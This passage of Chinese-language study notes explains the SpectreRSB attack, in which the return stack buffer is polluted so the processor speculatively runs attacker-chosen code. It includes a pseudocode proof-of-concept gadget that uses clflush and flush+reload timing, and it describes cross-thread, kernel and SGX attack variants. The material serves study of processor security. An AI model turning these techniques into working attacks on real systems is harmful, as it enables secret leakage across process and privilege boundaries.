- 通常，当一个函数调用（call）指令被执行时，返回地址会被压入RBS和软件栈中。作者提到，可以将这个调用指令转换为一个"推送（push）"和"跳转（jmp）"指令，这样，返回值仍会存在于软件栈中，但会在RSB中没有相应的值。
- 这种情况导致RSB中存储的返回地址与软件栈中的返回地址不匹配。当后续执行返回操作时，会出现错误预测，从而可能导致攻击者转移控制流到他们选定的代码上。

**使用弹出和跳转（pop and jump）来替换返回**：

- 另一种情况是，在函数返回时，不执行正常的返回（ret）指令，而是使用弹出（pop）指令和跳转（jump）指令。这会使得RSB中仍然保留着一个返回地址，而软件栈中的值则被移除。
- 当执行返回操作时，RSB中的地址与软件栈中的地址再一次不匹配，从而触发错误预测。

#### **S3：RSB的推测性污染**

- 在现代处理器中，当执行调用指令时，可能会产生“推测执行”（speculative execution）。在这些情况下，处理器会假定某个路径是正确的并执行相应的指令，而希望等到确认后再决定是否提交结果。
- 在这个推测过程中，返回地址会被压入返回栈缓冲区（RSB）中。

- 当发现推测执行的结果是错误的（即所谓的“错误预测”或misspeculation）时，处理器会放弃已经执行的推测操作，称之为“清除”（squash）。这样，推测执行所产生的结果不会被最终保留或提交到程序状态中。

- 尽管推测执行被清除，但在RSB中，原本压入的返回地址仍然保留。这为攻击者提供了一个机会，使他们能够在RSB中保留一个指向不可访问内存（如内核地址）的返回地址，而不引发异常或处理调用的副作用。

- 攻击者可以利用这种情况，恶意推送一个返回地址（例如，指向内核代码的地址），而程序的正常执行路径将以为它是在运行合法的返回。这样，当程序后来执行返回操作时，它可能会转移到攻击者控制的内存地址，导致潜在的安全问题，例如信息泄露或权限提升。

#### **S4：跨执行上下文使用 RSB**

在上下文切换时，执行线程留下的 RSB 值将被下一个线程重用。一旦我们切换到新线程，如果该线程执行 return，那么它将错误地推测到原始线程提供的地址。切换到未实施 RSB 重新填充的 操作系统 或 SGX 上下文也是如此。



### 8.3.spectreRSB攻击示例

```c
1. Function gadget()
2. {
3. 		push %rbp
4. 		mov %rsp, %rbp
5. 		pop %rdi 		//remove frame/return address
6. 		pop %rdi 		//from stack stopping at
7. 		pop %rdi 		//next return address
8. 		nop
9. 		pop %rbp
10. 	clflush (%rsp) //flush the return address
11. 	cpuid
12. 	retq 		//triggers speculative return to 17
13. } 				//committed return goes to 23
14. Function speculative(char *secret_ptr)
15. {
16. 	gadget(); 		//modify the Software stack
17. 	secret = *secret_ptr; //Speculative return here
18. 	temp &= Array[secret * 256]; //Access Array
19. }
20. Function main()
21. {
22. 	speculative(secret_address);
23. 	for (i = 1 to 256) //Actual return to here
24. 	{
25. 		t1 = rdtscp();
26. 		junk = Array[i * 256]; //check cache hit
27. 		t2 = rdtscp();
28. 	}
29. }
```

攻击从第 22 行开始，调用 speculative，其参数是要读取的敏感数据的内存地址。speculative 调用 gadget，它有两个目的：

（1） 返回地址被推送到 RSB（返回地址是第 17 行，在那里我们有要推测执行的有效负载gadget）;

（2） 我们跳转到 （inline assembly） 函数gadget，它将操纵软件堆栈以创建 RSB 和软件堆栈之间的不匹配。

在gadget()中，我们通过操控软件堆栈的堆栈指针和返回地址来使函数返回两个调用层次(也造成了软件堆栈与CPU RAS的不一致性)，也就是到达调用speculative（）函数的main函数。

但是，RSB 保存从 gadget 到 speculative 的返回值。因此，在第 12 行中，当返回执行时，CPU 会在第 17 行预测执行。堆栈顶部的刷新（第 10 行）确保返回地址的真实值将从内存中获取，而不是从缓存中获取，从而创建一个大的预测执行窗口。

第 17 行的推测执行读取密钥，然后通过访问 Array 中的数据相关索引（第 18 行）通过 flush reload cache 侧信道将其传达出去。

最后，获得真实的返回值，并粉碎了误测，将我们返回到第 23 行，在那里我们探测缓存以确定访问了哪个数据依赖缓存集以暴露密钥的值。

### 8.4.跨进程/线程攻击

攻击者和受害者在同一内核上建立共址。（1） 在上下文切换到攻击者后，他/她会 flush 共享地址条目（用于 flush reload）。攻击者还使用受害者地址空间中的有效负载gadget的目标地址污染 RSB;（2） 攻击者将 CPU 让给受害者;（3） 受害者最终执行返回，导致攻击者注入的 RSB 地址投机执行。步骤 4 和 5 切换回攻击者来测量泄漏。

![image-20250312201535330](https://cdn.jsdelivr.net/gh/Seraphinelle/picgo@image/image/20250411162118519.png)

#### attack2a：跨两个协同线程的攻击

**协同线程的设定**：攻击者线程和受害者线程都是在同一进程中协同工作的。攻击者利用线程之间的协同关系，以便在程序执行过程中控制它们的交替执行顺序（interleaving）。

**线程同步**：为了使这两个线程顺利协同，攻击者使用 `futex` 操作（快速用户空间线程共享）来同步两个线程。这种同步能够确保攻击者可以在适当的时机执行特定的操作，以执行攻击计划。

**RSB 污染**：在攻击者线程中执行 RSB 污染，即攻击者控制返回地址并将其插入到 RSB 中。在这个过程里，攻击者线程还可能清空受害者线程的栈顶内容，以移除该线程中正常的返回地址。

**返回地址的利用**：随后，让受害者线程返回时，由于其栈被清空（或者受到了污染），相应的返回地址可能来自于 RSB。由于这个返回地址是攻击者控制的，它可能导致程序跳转到攻击者希望执行的恶意代码。

**攻击结果的有效性**：这种攻击的成功证明了 SpectreRSB 可以在不同线程之间工作。然而，这种攻击的局限性在于，当返回发生在用户模式下时，攻击者不能直接读取内核数据。

#### attack2b：使用两个从内核返回的协同线程的攻击

受害者线程执行一个阻塞的系统调用（blocking system call）。在调用系统调用后，它会进入内核空间并通常会处于调用栈的深处。这种情况使得受害者线程不容易被干扰，因为它正处于内核态中，且可能在执行重要的内核功能。

在受害者线程执行阻塞系统调用之前，攻击者讲希望利用的返回地址注入到 RSB 中。在污染 RSB 后，等待受害者线程被解除阻塞（unblock）。

当受害者线程从阻塞状态中恢复并继续执行时，它将在内核模式下进行执行。当它尝试回归之前的调用栈时，由于 RSB 已被污染，它可能会错误地从一个不安全的地址返回。这种情况利用了对 RSB 污染的攻击方式。这一时刻，受害者线程将执行攻击者控制的代码，导致数据泄露或其他潜在的安全漏洞被利用。

### 8.5.在SGX上的攻击

**RSB 污染**：用户代码和 SGX 密闭环境共享同一地址空间，攻击者的目标是通过插入有效负载（payload gadget）的地址来污染 RSB。

**执行 Enclave 调用**：污染 RSB 之后，接下来攻击者执行一个 Enclave 调用，以切换到受信任的执行模式。在这个过程中，Enclave 调用必须触发一个未匹配的返回，导致系统在返回时按照 RSB 中的污染地址进行预测性执行。它使得攻击者能够以非授权的方式读取敏感数据。

**返回后检查缓存**：当 Enclave 调用返回时，攻击者可以利用之前污染的 RSB 中的不匹配地址进行预测性执行。返回到用户代码后，攻击者可以查看缓存以检测泄露情况，判断是否成功读取了敏感信息。
